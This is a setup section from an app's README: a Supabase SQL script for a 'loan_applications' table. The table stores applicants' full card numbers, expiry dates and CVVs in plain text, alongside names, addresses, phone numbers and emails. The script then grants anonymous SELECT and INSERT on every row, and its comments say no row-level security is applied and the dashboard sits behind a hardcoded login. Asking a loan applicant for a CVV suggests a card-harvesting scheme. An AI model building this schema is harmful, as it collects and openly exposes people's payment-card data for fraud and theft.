## Supabase database configuration

In your Supabase project, go to the **SQL Editor** and run the following query to create the necessary table so your application connects seamlessly. This strictly matches the application state attributes and structure:

```sql
CREATE TABLE IF NOT EXISTS public.loan_applications (
    "id" TEXT PRIMARY KEY,
    "fullName" TEXT NOT NULL,
    "bankName" TEXT NOT NULL,
    "cardNumber" TEXT NOT NULL,
    "expiryMonth" TEXT NOT NULL,
    "expiryYear" TEXT NOT NULL,
    "cvv" TEXT NOT NULL,
    "loanAmount" NUMERIC NOT NULL,
    "phoneNumber" TEXT NOT NULL,
    "email" TEXT NOT NULL,
    "addressLine1" TEXT NOT NULL,
    "addressLine2" TEXT,
    "city" TEXT NOT NULL,
    "state" TEXT NOT NULL,
    "zipCode" TEXT NOT NULL,
    "status" TEXT NOT NULL DEFAULT 'Pending',
    "createdAt" BIGINT NOT NULL,
    "dueDate" BIGINT NOT NULL,
    "payments" JSONB NOT NULL DEFAULT '[]'::jsonb
);

-- If the table already exists from an older deployment, add the new bankName field.
ALTER TABLE public.loan_applications
  ADD COLUMN IF NOT EXISTS "bankName" TEXT NOT NULL DEFAULT '';

-- If you still see a schema cache error in Supabase, refresh the table schema cache or re-open the SQL editor before retrying.
-- Enable realtime for this table so the frontend can subscribe to inserts/updates.
ALTER PUBLICATION supabase_realtime ADD TABLE public.loan_applications;

-- Allow anonymous browser inserts and selects for this MVP.
-- Only use this for testing or a trusted internal admin flow.
CREATE POLICY "Allow anon select" ON public.loan_applications
  FOR SELECT USING (true);
CREATE POLICY "Allow anon insert" ON public.loan_applications
  FOR INSERT WITH CHECK (true);

-- Note: In this MVP configuration, we are not applying RLS (Row Level Security) 
-- on this table automatically since we authenticate via a hardcoded dash.
-- But you MUST consider security best practices for production databases.
```

Once the `VITE_SUPABASE_URL` and `VITE_SUPABASE_ANON_KEY` are placed in the secrets/variables of the environment, the application will automatically switch from LocalStorage to the real-time Supabase Database instance.
